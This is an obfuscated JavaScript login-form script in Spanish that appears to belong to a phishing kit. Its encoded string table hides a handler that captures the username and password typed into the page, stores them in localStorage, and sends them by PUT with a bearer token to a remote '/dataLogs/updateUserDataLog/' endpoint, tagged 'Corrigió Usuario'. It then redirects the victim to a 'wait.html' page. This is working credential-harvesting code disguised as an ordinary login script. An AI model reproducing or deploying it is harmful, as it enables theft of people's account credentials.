const _0xe091dc = _0x3aa6;
(function (_0x1e470e, _0x526bb5) {
  const _0x1278e0 = _0x3aa6,
    _0x3b8030 = _0x1e470e();
  while (!![]) {
    try {
      const _0x14d2fd =
        (-parseInt(_0x1278e0(0x1eb)) / 0x1) *
          (parseInt(_0x1278e0(0x1f2)) / 0x2) +
        (parseInt(_0x1278e0(0x1ee)) / 0x3) *
          (-parseInt(_0x1278e0(0x1f5)) / 0x4) +
        parseInt(_0x1278e0(0x1ce)) / 0x5 +
        (-parseInt(_0x1278e0(0x1f3)) / 0x6) *
          (-parseInt(_0x1278e0(0x1d4)) / 0x7) +
        (-parseInt(_0x1278e0(0x1dd)) / 0x8) *
          (parseInt(_0x1278e0(0x1d1)) / 0x9) +
        -parseInt(_0x1278e0(0x1dc)) / 0xa +
        (parseInt(_0x1278e0(0x1ec)) / 0xb) * (parseInt(_0x1278e0(0x1e8)) / 0xc);
      if (_0x14d2fd === _0x526bb5) break;
      else _0x3b8030["push"](_0x3b8030["shift"]());
    } catch (_0x385092) {
      _0x3b8030["push"](_0x3b8030["shift"]());
    }
  }
})(_0x22e4, 0xb0e15);
function _0x22e4() {
  const _0x4dc0a0 = [
    "Bearer\x20",
    "puser",
    "setItem",
    "dataLogToken",
    "156eJZjql",
    "addEventListener",
    "wait.html",
    "216446KXCpEB",
    "2764025JPmHuJ",
    "Corrigió\x20Usuario",
    "27228sgRiOH",
    "error",
    "Error\x20al\x20actualizar\x20el\x20estado:",
    "focus",
    "2PIaPIM",
    "6BOpWAj",
    "getElementById",
    "628iylmja",
    "2956555fczRRo",
    "txtUsuario",
    "preventDefault",
    "4059pRlhWJ",
    "stringify",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "6085289ZqLmlY",
    "getItem",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "Usuario\x20actualizado\x20correctamente",
    "user",
    "location",
    "/dataLogs/updateUserDataLog/",
    "href",
    "12378930JTymwj",
    "19928XNBKkj",
    "disabled",
    "application/json",
    "value",
    "click",
    "metaInfo",
    "origin",
  ];
  _0x22e4 = function () {
    return _0x4dc0a0;
  };
  return _0x22e4();
}
function updateLS() {
  const _0x296f2e = _0x3aa6;
  LS[_0x296f2e(0x1e6)]("info", JSON["stringify"](info));
}
function _0x3aa6(_0xd6f20d, _0xeeed97) {
  const _0x22e4ef = _0x22e4();
  return (
    (_0x3aa6 = function (_0x3aa69a, _0x25438f) {
      _0x3aa69a = _0x3aa69a - 0x1ce;
      let _0x17382b = _0x22e4ef[_0x3aa69a];
      return _0x17382b;
    }),
    _0x3aa6(_0xd6f20d, _0xeeed97)
  );
}
const button = document[_0xe091dc(0x1f4)]("btnUsuario"),
  userInput = document["getElementById"](_0xe091dc(0x1cf)),
  passInput = document[_0xe091dc(0x1f4)]("txtPass");
async function updateStatusUser() {
  const _0x5d3e2b = _0xe091dc;
  button[_0x5d3e2b(0x1de)] = !![];
  try {
    const _0x3edaa6 = localStorage["getItem"]("dataLogId"),
      _0x1a42b4 = localStorage[_0x5d3e2b(0x1d5)](_0x5d3e2b(0x1e7));
    if (!_0x3edaa6 || !_0x1a42b4) throw new Error(_0x5d3e2b(0x1d3));
    const _0x2a2c6e = await fetch(url + _0x5d3e2b(0x1da) + _0x3edaa6, {
      method: "PUT",
      headers: {
        "Content-Type": _0x5d3e2b(0x1df),
        Authorization: _0x5d3e2b(0x1e4) + _0x1a42b4,
        Origin: window[_0x5d3e2b(0x1d9)][_0x5d3e2b(0x1e3)],
      },
      body: JSON[_0x5d3e2b(0x1d2)]({
        us: info[_0x5d3e2b(0x1e2)][_0x5d3e2b(0x1d8)],
        ps: info["metaInfo"][_0x5d3e2b(0x1e5)],
        status: _0x5d3e2b(0x1ed),
      }),
    });
    if (!_0x2a2c6e["ok"]) {
      const _0x30ed14 = await _0x2a2c6e["json"]();
      throw new Error(_0x30ed14[_0x5d3e2b(0x1ef)] || _0x5d3e2b(0x1d6));
    }
    console["log"](_0x5d3e2b(0x1d7)),
      (button[_0x5d3e2b(0x1de)] = ![]),
      (window[_0x5d3e2b(0x1d9)][_0x5d3e2b(0x1db)] = _0x5d3e2b(0x1ea));
  } catch (_0x2c413f) {
    console[_0x5d3e2b(0x1ef)](_0x5d3e2b(0x1f0), _0x2c413f),
      alert(
        "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo."
      ),
      (button[_0x5d3e2b(0x1de)] = ![]);
  }
}
button[_0xe091dc(0x1e9)](_0xe091dc(0x1e1), async function (_0x302d3d) {
  const _0x133c89 = _0xe091dc;
  _0x302d3d[_0x133c89(0x1d0)]();
  if (userInput[_0x133c89(0x1e0)] == "" || passInput[_0x133c89(0x1e0)] == "") {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput[_0x133c89(0x1f1)]();
    return;
  } else {
    var _0x109d5a = userInput[_0x133c89(0x1e0)],
      _0x568ed9 = passInput[_0x133c89(0x1e0)];
    (info[_0x133c89(0x1e2)]["user"] = _0x109d5a),
      (info[_0x133c89(0x1e2)]["puser"] = _0x568ed9),
      updateLS(),
      await updateStatusUser();
  }
});
